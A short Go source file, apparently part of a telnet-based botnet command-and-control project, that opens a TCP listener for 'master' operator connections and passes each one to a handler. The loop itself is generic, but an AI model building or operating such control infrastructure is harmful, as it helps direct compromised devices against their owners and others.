package master

import (
	"advanced-telnet-cnc/source/config"
	"fmt"
	"net"
)

func Serve() {
	listen, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Master.MasterPort))
	if err != nil {
		return
	}

	config.Logger.Info("Listening for master connections", "port", config.Master.MasterPort)

	for {
		conn, err := listen.Accept()
		if err != nil {
			continue
		}

		go NewMaster(conn).Handle()
	}
}
